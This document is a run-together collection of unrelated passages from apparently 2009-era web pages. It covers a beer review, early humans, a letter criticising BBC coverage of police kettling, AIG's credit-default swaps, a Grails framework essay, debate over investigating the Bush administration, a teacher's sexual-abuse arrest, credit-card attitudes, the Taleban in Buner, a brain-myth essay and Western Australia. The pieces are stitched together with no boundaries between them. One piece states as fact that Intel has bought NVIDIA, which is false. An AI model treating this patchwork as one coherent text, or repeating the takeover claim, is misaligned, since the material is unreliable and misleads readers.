Goes with : gratification without consequences .
Whether your enjoying those post - work / pre-bedtime hours , or relaxing on a weekend afternoon , Bohemian Black Lager is perfect for spending some time with .
If you 're going to enjoy it with dinner , allow me to recommend a bowl of Texas red or a sizzling platter of Tex - Mex .
Verdict :
So there you have it , Arizona .
I 've been as honest with you as I know how to be .
I know this is hard , but I hope we can still be friends .
Want to go to Four Peaks later ?
I 'll meet you there , there 's something I have to drink ...er ... do , first .
Happy ( secret ) drinking !
For Homo erectus , that difference of 200,000 years meant a major difference in climate .
Living closer to 750,000 BCE , Peking man and his brethren would have had to brave the cold of a chillier age .
That could mean that they used fire , though no clear evidence of this has been found .
Or , it could just mean that they were even more badass than we previously thought .
This is an email I sent to the journalist Julian Joyce after reading his ridiculously complacent and one - sided feature on " kettling " for the BBC website .
I 'll publish the response here too if he replies .
Dear Julian ,
I 'm writing regarding your recent article for the BBC website on the police practice of kettling , Police " kettle " tactic feels the heat .
I found the article partial and misleading and slanted in such a way that suggests the police 's view of the kettling tactic ( and the allegations of assault ) is the correct one ; this , despite the many instances we already have since the protests of the police misleading the media .
At several points you reproduce the police account of kettling and the G20 protests as though it were entirely uncontentious and the only academic source you quote supports the technique .
The whole article fails to bring out the fact important democratic principles are at stake .
For example , you suggest that anyone who agrees not to behave violently can leave a kettle and that the only ones who stay are those that insist on leaving non-peacefully : " Anyone determined to stay - like Ms Trench - may be held for hours , without access to food and water . "
" Eventually , say the police , most [ protesters ] get fed - up and agree to depart peacefully . "
In fact the police were n't letting anyone out ( including passers by not involved in the protests ) and those they did let out were often ( unlawfully ) forced to give their details and have images taken by forward intelligence teams , something which you , again , neglect to mention in your article .
Furthermore , like the rest of the BBC 's coverage , the article makes no mention of the kettling of Climate Camp , the most egregious example of police kettling at the G20 protests according to witnesses ( see for example here , here and here ) .
The camp was entirely good - natured and co-operative but the police kettled it aggressively anyway , brutally attacking peaceful protesters in the process .
There 's plenty of footage on YouTube that proves this .
There are several more examples of your complacent attitude towards kettling and the police ’s version of events .
You say : " Additionally , investigators will want to know the context of the alleged assaults , and also whether the widely - circulated online video clips tell the whole story .
Police sources have told the BBC they expect the current inquiry to support the continued use of kettling . "
That would be the inquiry by a former police chief ( Denis O'Conor ) responsible to the Home Secretary Jacqui Smith , who has already declared the G20 policing a great success , then would it ?
Luckily we have this police investigation to tell us the " whole story " then ( a story which changes by the day it seems , but let ’s not mention that ) .
This is followed by two sentences put together in such a way that suggests your view of the " raw numbers " ( and hence the success of the kettling operation ) is identical to that of the police .
" As for raw numbers , policing tactics at the G20 protests appears to have paid off .
Despite the two instances of alleged police assault , chiefs are said to be happy there were relatively few arrests and injuries compared to previous summits . "
Oh really ?
I 'd have thought that one death at police hands would suggest the police tactics did n't pay off .
There 's likely to be far more investigations into allegations of assault as more evidence emerges .
Hard too to put a number on the damage done to our democracy as more and more people are deterred from attending protests for fear of being kettled and beaten , but , hey , as long as the police chiefs are " happy " .
You conclude by suggesting that the final word on the legality of kettling has been had following the ruling of the Law Lords in January that the practice does not amount to a violation of the right to demonstrate and freedom of expression under the Human Rights Act .
You neglect to mention the fact that the case is being taken to the European Court of Human Rights , who , it is hoped , will take a more robust approach and uphold our fundamental democratic right to protest .
I suggest that , in the future , if you wish to be taken seriously on this important issue , yourself , and the rest of the BBC 's journalists , should take a slightly more sceptical attitude to what is fed to you by official sources , especially the police .
Best regards ,
Guy Aitchison
These exotic instruments acted as a form of insurance for the securities .
In effect , A.I.G. was saying if , by some remote chance ( ha ! ) those mortgage - backed securities suffered losses , the company would be on the hook for the losses .
And because A.I.G. had that AAA rating , when it sprinkled its holy water over those mortgage - backed securities , suddenly they had AAA ratings too .
That was the ratings arbitrage .
“ It was a way to exploit the triple A rating , ” said Robert J. Arvanitis , a former A.I.G. executive who has since become a leading A.I.G. critic .
Why would Wall Street and the banks go for this ?
Because it shifted the risk of default from themselves to A.I.G. , and the AAA rating made the securities much easier to market .
What was in it for A.I.G.?
Lucrative fees , naturally .
But it also saw the fees as risk - free money ; surely it would never have to actually pay up .
Like everyone else on Wall Street , A.I.G. operated on the belief that the underlying assets  housing  could only go up in price .
That foolhardy belief , in turn , led A.I.G. to commit several other stupid mistakes .
When a company insures against , say , floods or earthquakes , it has to put money in reserve in case a flood happens .
That ’s why , as a rule , insurance companies are usually overcapitalized , with low debt ratios .
But because credit - default swaps were not regulated , and were not even categorized as a traditional insurance product , A.I.G. did n’t have to put anything aside for losses .
And it did n’t .
Its leverage was more akin to an investment bank than an insurance company .
So when housing prices started falling , and losses started piling up , it had no way to pay them off .
Not understanding the real risk , the company grievously mispriced it .
Second , in many of its derivative contracts , A.I.G. included a provision that has since come back to haunt it .
It agreed to something called “ collateral triggers , ” meaning that if certain events took place , like a ratings downgrade for either A.I.G. or the securities it was insuring , it would have to put up collateral against those securities .
Again , the reasons it agreed to the collateral triggers was pure greed : it could get higher fees by including them .
And again , it assumed that the triggers would never actually kick in and the provisions were therefore meaningless .
Those collateral triggers have since cost A.I.G. many , many billions of dollars .
Or , rather , they ’ve cost American taxpayers billions .
The regulatory arbitrage was even seamier .
A huge part of the company ’s credit - default swap business was devised , quite simply , to allow banks to make their balance sheets look safer than they really were .
Under a misguided set of international rules that took hold toward the end of the 1990s , banks were allowed use their own internal risk measurements to set their capital requirements .
The less risky the assets , obviously , the lower the regulatory capital requirement .
How did banks get their risk measures low ?
It certainly was n’t by owning less risky assets .
Instead , they simply bought A.I.G. ’s credit - default swaps .
The swaps meant that the risk of loss was transferred to A.I.G. , and the collateral triggers made the bank portfolios look absolutely risk - free .
Which meant minimal capital requirements , which the banks all wanted so they could increase their leverage and buy yet more “ risk - free ” assets .
This practice became especially rampant in Europe .
That lack of capital is one of the reasons the European banks have been in such trouble since the crisis began .

At its peak , the A.I.G. credit - default business had a “ notional value ” of $ 450 billion , and as recently as September , it was still over $ 300 billion .
( Notional value is the amount A.I.G. would owe if every one of its bets went to zero . )
And unlike most Wall Street firms , it did n’t hedge its credit - default swaps ; it bore the risk , which is what insurance companies do .
Why Grails matters ?
That ’s a fair question if we take a look at the huge amount of web frameworks which an average Java developer is used to .
Behind this question actually there ’s another one hidden : “ Does Grails really brings something new or is it just another web framework ? ” .
Historically speakng , we can see that the only really revolutionary web framework on the Java platform is Struts .
Not because is the best , but only because it was the first ( at least that I know ) .
After Struts we can see the amazing proliferation of zillions of web frameworks , all promising the same thing : “ revolutionize web development through huge gains in developer productivity ” .
Some really did it ( but MANY more did n’t ) , and at the end of the day , there was this feeling that they actually did n’t bring anything new ( with some exceptions , like VRaptor , Tapestry , JSF and some others ) .
So the question is : will Grails be only one more in the list ?
And my answer is : no !
That ’s because Grails brings some new technology , but more than that , Grails bring us a “ new ” work philosophy .
This “ new ” work philosophy is actually inspired on Ruby on Rails ( RoR ) .
Just to remember , Grails is not the original name of this framework : Groovy on Rails was .
When RoR started to became popular , it was like a slap on the face of MANY Java developers .
Suddenly , our methodology and tools became amazingly lame ( maybe “ bored ” should be the word ) .
And in that same moment , some JEE problems became crystal clear to everyone .
Hard component integration
If you ’re a Java developer you know that we have at our disposal some tools like Hibernate , Spring , Log4 j and many others that are simply marvelous .
They really improve our productivity , but when we have to integrate them , it ’s usual to see all this gain fading in front of us .
There are actually too many jar files to manage .
It ’s really common to face problems like incompatibilities , version problems and so on .
Really a pain in the ass many times .
Configuration files
It ’s amazing the amount of time spent on these beasts .
We have to configure our servers , the application context , framework behavior , managed beans , tag libraries and so on .
And all these things are made using XML files , which is a great format , but whose syntax is basically the opposite of the one we are used too , which is the Java ’s syntax .
It ’s true that we can avoid these files if we are using a great IDE , but this is only a silly illusion .
You know that some day you ’ll have to face these bastards .
Repetition , repetition , repetition and more repetition
If you ’re working on a simple CRUD application , the repetitiveness becames clear .
Usually you have to create basically four pages for each entity : one for editing , another one for creating , another one for listing and , finally a page which will show the details of that register .
So , if you have N entities in your application , you ’ll have to write approximately 4 * N pages .
And what is more sad : basically , these pages are all very much the same .
The only change is which fields are being exposed .
Whould ’nt it be nice if you could build these pages automatically ?
Stack configuration
Here is the situation : a new programmer arives at your office and you need to setup his environment .
So , there are two options : you already have an image ready to be used or you do n’t .
In the second case , you know how boring this is : you have to install JDK , IDE , libraries , servers and so on .
Even worse : sometimes you have to configure the developers IDE to work properly with the components you ’re used to .
Of course , someone could say : “ but if you install an IDE like Netbeans , all this stuff are there ready to be used ” .
Well , this is only half true : things are not so beautiful on the real world .
Ruby on Rails ( and Grails ) philosophy
DRY : Do n’t Repeat Yourself
The question is : if there are tasks which are repetitive in the development process , why they are executed by humans and not by the framework ?
After all , developers are paid to implement a business model , not to execute repetitive tasks .
At leat in theory they ’re paid to THINK !
At RoR we can see the return of something that we had simply ignored : scaffolding .
The framework generates automatically for the developer several artifacts which are usually related to repetitive tasks , like for example views and controllers .
So , all the repetitive tasks are gone , and your work will be to only customize these artifacts .
Neat !
( where we had seen this before ?
Personal databases like Access ( damn ! ) , Paradox , FileMaker and many others )
Convention over configuration ( or zero configuration )
Here is where productivity soars .
You do n’t need configuration files if everything is in its place , do you ?
When working with RoR or Grails , the framework will stipulate some conventions that simply make configuration files unnecessary .
For example : in Grails every controller is stored on a specific directory .
So , it ’s not necessary to told the framework which are the controllers .
He ’ll find them automatically .
Actually , when working with Grails and RoR , it ’s quite common that the only configuration file you ’ll ever touch will be the one which is responsible for defining the dabase access configuration !
The basic idea here is : configuration files are unnecessary because the application is already well organized .
The configuration , in this case , is the application itself !
But , more than that , it ’s important to think in conventions over configuration , and not instead of configurations .
Why ?
Simple : because these applications usually are targeted at the enterprise environment , so you ’ll have to integrate them with it .
So , in this case , you ’ll have to change some configuration files , but guess what : it ’ll be far easier , because in these cases , you ’re not working with XML .
Full stack
As RoR , Grails installation is actually an IDE with everything you need .
To install it , all you need is the JDK and Grails installation ( of course ! ) .
You do n’t even need to concern about installing some other IDE or server .
All you ’ll need is a simple text editor .
And in Grails case , it is based on several components whose quality is already attested like Hibernate , Spring , SiteMesh , Log4J , Apache Commons and many others .
So you do n’t need to worry about how to integrate those libraries and frameworks , because they already are !
Again , all you need to worry is your business logic !
So , after all this talk about RoR , and knowing that “ something ” called JRuby exists , the question is :
Why Grails and not Ruby on Rails ?
Actually , it does n’t matter .
Your productivity boost will be basically the same .
However , for the Java developer , already used to it ’s syntax , Grails will be way more familiar , because it ’s based on Groovy , which , by the way , have basically the same Java syntax ( with some syntatic sugar ) .
Your learning curve will be reduced on this case .
Another important point is the fact that you ’ll be able to reuse all your legacy code on a Grails project without changing anything on it ( which is not a Grails advantage , because this same code reuse can be achieved using JRuby too ) .
But , at the end of the day , this can be solved with a single question : which language do you prefer ?
Grovy ( Java ) or Ruby ?
Java ?
Go Grails !
Ruby ?
Go RoR !
Finally answering the question : “ why Grails matters to a Java developer ? ”
After the success of RoR , the problems of the JEE platform became clear to everyone .
Even if Grails or RoR suddenly disappear , from now on the new frameworks that will emerge will be following this “ new ” philosophy .
And taking into consideration that Grails was developed since it ’s begining focusing on the Java developer , it ’s an undeniable fact that it will have a huge influence over all the new developments on this area from now on .
Or , being more direct : because RoR and Grails suddenly showed us that working with the JEE is amazingly boring .
Democrats are having a civil but heated debate about the proper tone to adopt while investigating the likely misdeeds of the Bush administration .
Nancy Pelosi , who famously took " impeachment off the table " during her initial historic tenure as Speaker , has developed , apparently , some steel , and recently assured Rachel Maddow of her fear that a commission approach , much favored and actively promoted by Vermont Senator Patrick Leahy , will wind up giving too much immunity to too many malefactors .
In his turn , Leahy , as Chairman of the Senate Judiciary Committee , argues , as it would appear does President Obama , that vengeance should give way to full disclosure , so that what happened will not happen again .
Looking forward , not back .
Sheldon Whitehouse , Rhode Island 's new Senator , who has made a notable debut as a quintessential prosecutor and serves on both the Senate Judiciary Committee and the Senate Intelligence Committee , agrees , but seems more concerned than Leahy that the " commission " approach could lead to inefficiency and unintended consequences .
In a move that could take some of the political heat off the new Obama administration , he says he can and will pursue an independent inquiry , with or without the administration 's enthusiastic support .
Meanwhile , House Judiciary Committee Chairman John Conyers , with the patience of Job , issues deadly rational statements describing the wrongdoing , and , finally , issues subpoenas to back them up .
Non-elected observers , namely law professor Jonathan Turley and commentator Glenn Greenwald take the politically uncomfortable but otherwise hard to refute position that if criminal activity occurred , the law demands , not allows , prosecution ( see here and here ) .
Americans who take the view that governmental abuses of the scale alleged here need to be taken seriously are standing in the spiritual company of some pretty impressive predecessors , the signers of the Declaration of Independence .
The parallels between the event that occasioned America 's most patriotic annual celebration and today 's intra party discussion far exceed the coincidence that both were in reaction to an imperial personage named " George . "
It 's useful to remember that the signers felt obligated to provide an explanation of their action in deference to " a decent respect to the opinions of mankind , " words difficult to imagine from the mouth of our recent vice president .
Here are some of the issues they felt passionately enough about to risk their lives and reputations .
Signing Statements : " He has refused his Assent to Laws , the most wholesome and necessary for the public good . "
Bogus Department of Justice Legal Opinions : " He has combined with others to subject us to a jurisdiction foreign to our constitution , and unacknowledged by our laws ; giving his Assent to their Acts of pretended Legislation . "
Rendition : " For transporting us beyond seas to be tried for pretended offences . "
Obstructive use of veto : " He has forbidden his Governors to pass Laws of immediate importance , unless suspended in their operation till his Assent should be obtained ; and when so suspended , he has utterly neglected to attend to them . "
Undue Deference to Military Opinion : " He has affected to render the Military independent of and superior to the Civil Power . "
Habeas Corpus : " For depriving us in many cases , of the benefits of Trial by Jury . "
A former teacher at a Christian preparatory school in Sunnyvale was arrested on sexual - abuse charges stemming from allegations involving a 13 - year - old girl she taught eight years ago .
Sunnyvale Department of Public Safety Capt .
Doug Moretto said Abigail Anne Holloway , 33 , who taught physical education at Kings Academy on North Britton Avenue , was arrested Thursday in Englewood , Colo. , where she had been teaching at another Christian school .
Holloway is expected to have an extradition hearing in Colorado and be transferred to the Santa Clara County Jail next week , Moretto said .
He described the arrest warrant as containing “ multiple counts of child abuse that are sexual in nature . ”
The allegations stem from 2001 .
Moretto declined to say how the case came to the attention of Sunnyvale authorities , saying only that information about the alleged abuse emerged in December .
According to authorities , Holloway had an illegal sexual relationship with a 13 - year - old girl — her student — when she worked at Kings Academy .
Holloway was employed there from 2000 to 2002 , according to the school ’s public relations director , Kriss Hayward .
“ As with all our teachers and coaches , she underwent a full background check and fingerprinting , ” Hayward said , adding that her criminal history came up clean .
“ It ’s always shocking and sad ” to hear news of this nature , Hayward said .
None of the current 860 students attended school when Holloway taught , since she left the school years ago .
Hayward also said most school administrators do not know Holloway , or the identity of the 13 - year - old student , who is now likely 21 years old .
Other than Kings Academy , Moretto said Holloway ’s employment history is “ sketchy , ” although public safety officers believe she worked at other schools in Santa Clara County in 2004 and 2005 , the year she moved to Colorado .
Anyone with information regarding this case , or who believes they were a victim , is encouraged to call detective Kirk Kim at ( 408 ) 730-7120 , police said .

' Truth Commission ' critic accuses Leahy of ' whitewash ' Rachel Oswald
Published : Thursday March 12 , 2009
Print This Email This Passions surrounding various proposals that would investigate Bush administration wrongdoings are extremely high with interested parties not shying away from using harsh rhetoric towards fellow supporters of probes .
Speaking to Raw Story , Michael Ratner , president of the Center for Constitutional Rights and a human rights attorney , says he is opposing Senate Judiciary chairman Patrick Leahys proposed ' Truth Commission ' because it doesnt go far enough .
" We re talking about a whitewash with Leahy .
Are we some Latin American country where we dont have a democracy robust enough to try people ? "
Ratner said .
 [ Leahys ] essentially diffusing the issue so theres not as much pressure on prosecution .
It s not really going to go far .
[ The commission is ] going to divert us for a few years and were never going to see something come out of it . 
Ratner said he and the Center for Constitutional Rights want to see criminal prosecutions of officials at the highest level of the Bush administration , the so - called principals  who were the architects of controversial polices and signed off on them .
 Cheney has openly said that he approved the water boarding memo and that he would do it again ,  Ratner said , adding ,  My view is you absolutely have to have prosecutions to have deterrents [ for future executive power abuses ] .
Speaking at last Wednesdays Senate Judiciary Committee Hearing on the matter , Leahy ( D - VT ) said ,  If criminal conduct occurred , this senator wants to know about it .
 Im trying to get the ability to find out if criminal conduct occurred so it wont happen again .
If crimes occurred , I dont think they should be swept under the rug . 
Leahy has said he would not rule out criminal prosecutions of high - level Bush appointees as have other senators supportive of his proposal , such as Sen. Sheldon Whitehouse ( D - RI ) .
Ratner said he objects to comments made by Leahy critical of people who are fixated on prosecution . 
 That s me ,  Ratner said , adding ,  Those [ comments ] are all basically saying we re not prosecuting .  "
Ratner said he has been unexpectedly pleased with the public support for criminal prosecutions in the country .
More than 100 organizations large and small have signed on to calls throughout the years for a special prosecutor to look into Bush administration abuses while at least 18 groups have already affirmed their support of Leahys Truth Commission proposal .
Approximately 40 percent of those polled by Gallup at the end of January support criminal investigations while 25 percent to 30 percent support an investigation by an independent panel .
35 percent to 25 percent of those polled dont want any investigation at all .

Please review our list of best credit cards , or use our CardMatch ™ tool to find cards matched to your needs .
It ’s no surprise that many consumers are unhappy with credit card companies , particularly as many issuers have recently raised interest rates and lowered credit limits on customers .
But some surveys and financial experts suggest that consumers ’ disappointment could lead to long - term behavioral changes that may leave credit card issuers out in the cold .
“ People want to avoid debt like the plague right now , ” says Frank Jones , manager of marketing analysis for Southfield , Mich . - based business advisory firm AlixPartners .
So much so that in a 2009 survey designed to determine how the recession is changing consumers ’ long - term lifestyle plans , AlixPartners found that 36 percent of respondents planned to stop using credit cards completely .
Such an extreme reaction is no surprise to Michael Mihalik , author of “ Debt is Slavery : And Nine Other Things I Wish My Dad Had Taught Me About Money . ”
“ I think one of the things people are getting out of the experience of this economic downturn is they are feeling like slaves to their debt , ” says Mihalik , who details in his book how he climbed out of $ 10,000 in credit card debt .
“ Slavery is a very harsh term , but I ’m sure people are feeling burdened and oppressed by the debt that they ’ve accumulated . ”
Several surveys bear that out .
When AlixPartners asked respondents what their No. 1 financial concern was today , the top answer was eliminating personal debt .
When asked what their No. 1 financial concern would likely be five years from now , eliminating debt remained a top answer , second only to recovering retirement savings .
“ What that told us was they want to eliminate debt now , but a lot of people are in deep enough that they think it ’s going to take more than just this year , ” says Jones .
The survey also suggests that consumers ’ distaste for debt is something that will stick around for the long haul rather than being merely a knee - jerk reaction to the economy , Jones adds .
What we ’re going through right now is a real painful experience , but it ’s making people evaluate what ’s really important in their lives , what really has value and what does n’t have value .
Michael Mihalik , Author
Another study , conducted by Worthington , Ohio - based market intelligence firm BIGresearch , yielded similar results , underscoring the depth to which consumers ’ attitudes toward debt have changed , says Pamela J. Goodfellow , senior analyst for BIGresearch .
When asked what changes they would make over the next five years , 43.4 percent of respondents said they would not incur a large credit card debt .
The desire to avoid credit card debt was not only relegated to those with lower incomes .
In fact , BIGResearch ’s study found that those who made more than $ 75,000 were more likely than average to cut back on credit card usage and pay off balances each month .
Age affects perception
While the credit crisis has taken its toll on every demographic , some age groups are planning to make bigger adjustments than others .
The youngest users of credit are particularly interested in avoiding mountains of debt .
Of those who took the AlixPartners survey , “ the younger ones showed a tremendous level of maturity in terms of learning the lessons from their parents ’ mistakes ” says Jones .
Not only do they plan to save a greater percentage than other age groups , but they were more likely than other age groups to say that they would be more cautious with credit cards in the future .
A study conducted by debt counseling organization Money Management International found similar results .
Since June of 2008 , the number of Americans increasing their savings rose 50 percent .
Members of Generation Y — those born between 1980 and 1996 — are leading the way .
Likewise , The Charles Schwab Corp. released a survey in March 2009 that found that 52 percent of young adults between the ages of 23 and 28 said the single most important issue for Americans to act on today was making better choices about money .
More than half of that same age group also said that financial education should be a bigger priority for grades K - 12 than physical education and sex education combined .
“ It ’s as if they ’re looking at their parents and saying , ‘ No way , ’ ” Jones says .
Long - term implications
It ’s too soon to tell whether Americans will remember the pain of the credit crisis once an economic recovery is in full - swing and credit is free - flowing again .
But some say the gravity of this particular downturn sets it apart from other instances when people expressed a desire to manage their money more effectively .
I think a lot of people would say the economy just had a heart attack .
And maybe that will be enough to drive people to actually change their behaviors as opposed to saying they want to change .
Frank Jones , AlixPartners
Jones compares it to a dieter trying to lose weight .
“ I ’d like to lose 10 pounds , but I ’m in good health and do n’t really have to , so who knows when I ’m going to get around to doing it .
But if I just had a heart attack and the doctor said I had to lose weight , I think my success rate would be higher .
I think a lot of people would say the economy just had a heart attack .
And maybe that will be enough to drive people to actually change their behaviors as opposed to saying they want to change . ”
But once consumers actually make that change , it gets easier , Mihalik says .
“ The most painful experiences can actually lead to the best growth .
What we ’re going through right now is a real painful experience , but it ’s making people evaluate what ’s really important in their lives , what really has value and what does n’t have value . ”
Once people get used to living within their means rather than reaching for a credit card to buy the latest iPod or a new outfit , they will realize that they ’re not missing that much .
Not only that , but the freedom from having to worry about interest rate hikes and minimum payments will be a far greater reward than new merchandise , Mihalik adds .

The Taleban have not yet heeded calls to disarm Taleban militants operating in Pakistan 's Swat region who agreed a peace deal with the government have expanded operations into nearby Buner .
Dozens of militants have been streaming into bordering Buner to take over mosques and government offices .
Buner is part of the Malakand region , which has just seen the implementation of Sharia law under the peace deal .
But the Taleban have mainly operated in Swat , where they fought the army from August 2007 until this year 's deal .
Under the deal the Taleban were expected to disarm .
Buner district is only about 100 km ( 62 miles ) from the capital , Islamabad .
Mian Iftikhar Hussain , information minister for North West Frontier Province , said he had received reports of the Taleban expansion .
Recent reports said the Taleban had ransacked the offices of international aid and development agencies working in Buner .
Some employees of the agencies were also briefly taken hostage before being released on Monday .
Patrols
The Taleban have banned the playing of music in cars and are also using mosques to invite local youth to join them .
We implemented Sharia law as it was a demand of the people , not just the Taleban
Mian Iftikhar Hussain ,
NWFP official The Taleban have also started regular patrols in the district .
Buner 's police chief , Rashid Khan , said the police had lodged an official complaint over the matter .
But the Taleban are not mentioned in the reports , which only names " unknown persons " as the culprits .
Mian Iftikhar Hussain maintains that the Taleban must disarm as agreed under the peace deal .
" Even Sufi Mohammad has said that there is no reason for the Taleban not to disarm , " he said .
He was referring to the head of a local religious group who has been acting as the government 's chief negotiator with the Taleban .
" We initially adopted the path of dialogue and reconciliation , but this is as far as we can go , " Mr Hussain said .
" We implemented Sharia law as it was a demand of the people , not just the Taleban .
" If they continue with their activities , they will not have the support of the people .
" The majority of the people are now with the government .
The government will not stand by and tolerate [ the violation of ] the peace deal . "
The Taleban say they will not lay down their arms until Sharia is fully implemented .
Muslim Khan , a spokesman for the Swat Taleban , said his movement 's aim was the enforcement of Sharia law in all of Pakistan .

Intel Buys Over NVIDIA
It 's official .
Intel has secretly agreed to buy over beleaguered NVIDIA !
The ink is still wet and there is still much to work out before NVIDIA becomes part of Intel , but it is a done deal according to an inside source .
The press offices of both Intel and NVIDIA strenously denied this , of course .
The graphics chip design company has been at the forefront of 3D graphics technology until recently , when a combination of a technical slump and a global recession hit it hard .
Sales were so bad they had to rebrand one of their older graphics cards as a new model .
They were also hit badly by problems with their mobile GPUs , which irked not only their users but also their OEM partners .
It was a remarkably rapid reversal of fortunes for NVIDIA .
With several key design successes , NVIDIA rapidly went from an obscure company to arguably the leading 3D graphics processor company in the world .
Right before their fall from grace , the company boasted a retail market share of over 80 % .
For a long while , it appeared that they could do no wrong .
In fact , the company was so supremely confident of their success that they even took on CPU behemoth , Intel .
Their company president and CEO , Huang Jen-Hsun , openly belittled Intel 's upcoming Larrabee processor , claiming that it was nothing more than " a PowerPoint slide " .
Ironically , it is Intel and the Larrabee processor that will be NVIDIA 's salvation .
The Intel Larrabee
The Larrabee is Intel 's next generation processor microarchitecture .
It is a many - core x86 architecture designed to address what was grossly lacking in the remarkable Intel arsenal of products - credible 3D graphics processing capability .
Through Larrabee , Intel is attempting to do ( in reverse ) what NVIDIA and ATI were attempting to do with their General Purpose GPU ( GPGPU ) initiative .
Larrabee is Intel 's attempt at making a CPU that is more like a GPU .
Although a single Larrabee processor core is hardly powerful enough to match the graphics processing capability of modern GPUs , Intel intends to use large numbers of these Larrabee cores to match or even exceed the performance of dedicated GPUs .
For more information on Larrabee , take a look at the Intel Larrabee Processor Tech Report .

Whenever I venture out of the Ivory Tower to deliver public lectures about the brain , by far the most likely question I can expect as the talk winds up is , " Do we really only use 10 percent of our brains ? "
The look of disappointment that usually follows when I say it is n't so strongly suggests that the 10 - percent myth is one of those hopeful shibboleths that refuses to die simply because it would be so darn nice if it were true .
I 'm sure none of us would turn down a mighty hike in brainpower if it were attainable , and a seemingly never - ending stream of crackpot schemes and devices continues to be advanced by hucksters who trade on the myth .
Always on the lookout for a " feel - good " story , the media have also played their part in keeping the myth alive .
A study of self - improvement products by a panel of the prestigious National Research Council , Enhancing Human Performance , surveyed an assortment of the less far - fetched offerings of the " brain booster " genre and came to the conclusion that ( alas ! ) there is no reliable substitute for practice and hard work when it comes to getting ahead in life .
This unwelcome news has done little , however , to dissuade millions who are comforted by the prospect that the shortcut to their unfulfilled dreams lies in the fact that they just have n't quite found the secret to tap this vast , allegedly unused cerebral reservoir .
Why would a neuroscientist immediately doubt that 90 percent of the average brain lies perpetually fallow ?
First of all , it is obvious that the brain , like all our other organs , has been shaped by natural selection .
Brain tissue is metabolically expensive both to grow and to run , and it strains credulity to think that evolution would have permitted squandering of resources on a scale necessary to build and maintain such a massively underutilized organ .
Moreover , doubts are fueled by ample evidence from clinical neurology .
Losing far less than 90 percent of the brain to accident or disease has catastrophic consequences .
What is more , observing the effects of head injury reveals that there does not seem to be any area of the brain that can be destroyed by strokes , head trauma , or other manner , without leaving the patient with some kind of functional deficit .
Likewise , electrical stimulation of points in the brain during neurosurgery has failed so far to uncover any dormant areas where no percept , emotion or movement is elicited by applying these tiny currents ( this can be done with conscious patients under local anesthetic because the brain itself has no pain receptors ) .
The past hundred years has seen the advent of increasingly sophisticated technologies for listening in on the functional traffic of the brain .
The goal of behavioral neuroscience has been to record electrical , chemical and magnetic changes in brain activity and to correlate them with specific mental and behavioral phenomena .
With the aid of instruments such as EEGs , magnetoencephalographs , PET scanners and functional MRI machines , researchers have succeeded in localizing a vast number of psychological functions to specific centers and systems in the brain .
With nonhuman animals , and occasionally with human patients undergoing neurological treatment , recording probes can even be inserted into the brain itself .
Despite this detailed reconnaissance , no quiet areas awaiting new assignments have emerged .
All told , the foregoing suggests that there is no cerebral spare tire waiting to be mounted in service of one 's grade point average , job advancement , or the pursuit of a cure for cancer or the Great American Novel .
So , if the 10 - percent myth is that implausible , how did it arise ?
My attempts to track down the origins of the 10 - percent myth have not discovered any smoking guns , but some tantalizing clues have emerged ( more are recounted in the references below ) .
One stream leads back to the pioneering American psychologist , William James , in the late 19th and early 20th centuries .
In addition to his voluminous scholarly work , James was a prodigious author of popular articles offering advice to the general public .
In these exhortatory works James was fond of stating that the average person rarely achieves but a small portion of his or her potential .
I was never able to find an exact percentage mentioned , and James always talked in terms of one 's undeveloped potential , apparently never relating this to a specific amount of gray matter engaged .
A generation of " positive thinking " gurus that followed were not so careful , however , and gradually " 10 percent of our capacity " morphed into " 10 percent of our brain . "
Undoubtedly , the biggest boost for the self - help entrepreneurs came when the famous adventurer and journalist Lowell Thomas attributed the 10 - percent - of - the - brain claim to William James .
Thomas did so in the preface he wrote , in 1936 , to one of the best - selling self - help books of all time , Dale Carnegie 's How to Win Friends and Influence People .
The myth has never lost its steam since .
Other sources for the ubiquity of the 10 - percent myth probably come from popular authors ' misconstrual of scientific papers by early brain researchers .
For example , in calling ( for technical reasons ) a huge percentage of the cerebral hemispheres the " silent cortex , " early investigators may have left the mistaken impression that what is now referred to as the " association cortex " had no function .
That was far from the researchers ' intention , but that is what seems to have filtered through to the public .
Likewise , early researchers ' appropriately modest admissions that they did n't know what 90 percent of the brain was doing probably fostered the widespread misconception that the leftovers did nothing .
In my quest for the seminal utterance of the 10 - percent myth , I frequently came across the claim that Albert Einstein had once explained his own brilliance by reference to the myth -- Einstein 's enormous prestige , of course , making it unassailable thenceforth .
A careful search by the helpful people at the Albert Einstein archives , however , was unable to provide me with any record of such a statement on his part .
So it remains probably just another of those instances where promoters with a point or a buck to make have misappropriated the clout of Einstein 's name to further their own endeavors .
The 10 - percent myth has undoubtedly motivated many people to strive for greater creativity and productivity in their lives -- hardly a bad thing .
The comfort , encouragement and hope that it has engendered helps explain its longevity .
But , like so many uplifting myths that are too good to be true , the truth of the matter seems to be its least important aspect .
So we are a nation of laws after all .
It was starting to look like business could do anything they want , instead of the usual almost everything they want .
Cuomo certainly knows how to get fast results , even when the initial reaction is stonewalling .
Cuomo ’s office alleged that Thain did n’t answer the questions under instructions from Bank of America , and as a result , the bank is interfering with its investigation of the bonus payments .
Cuomo has been investigating $ 3.6 billion in bonuses Merrill Lynch executives received less than a month before the company completed its sale to Charlotte , N.C. - based Bank of America , and whether investors were properly informed about Merrill ’s finances .
The payments came as New York - based Merrill was on the brink of reporting a more than $ 15 billion fourth - quarter loss .
The investment bank was among the hardest hit by the ongoing credit crisis .
The bonuses stirred controversy because Merrill ’s bigger than expected loss prompted Bank of America to seek more government bailout money to complete the acquisition .
The government agreed to give Bank of America an additional $ 20 billion in January to absorb Merrill .

About
Western Australia is Australia 's largest state , covering the western third of the continent which totals a huge 2,645,615 km2 or 1,021,478 sq mi .
This is approximately 3.5 times the size of Texas and makes Western Australia the second largest state / province / national region in the world .
The capital city Perth , is one of the most isolated metropolitan areas on Earth .
The nearest city to Perth with a population over 1 million is Adelaide in South Australia , which is 2,104 kilometres ( 1,307 mi ) away .
Perth is physically closer to East Timor and Jakarta , Indonesia , than it is to Sydney , Melbourne , and Brisbane .
It is the antipode of Hamilton in Bermuda .
Perth is known as Australia 's sunniest city and enjoys a Mediterranean climate .
In the peak of summer , the temperature can be unbearable as it reaches well into the 40s ( celsius ) , but the winters are mild .
The city is organized and modern and has many parks and superb beaches for swimming and surfing .
The beautiful Swan River flows through Perth and many Perth residents define themselves as living either north of the river or south of the river .
The river drains into the Indian Ocean at the Port of Fremantle , a beautiful town with many historic buildings .
If you head south from Perth , you will come across many pleasant towns like Albany and Esperance .
In this general area are a number of nice beaches and some superb surfing particularly at Margaret River .
South West Australia also contains areas of Karri Forest which which contain some of the tallest trees in the world .
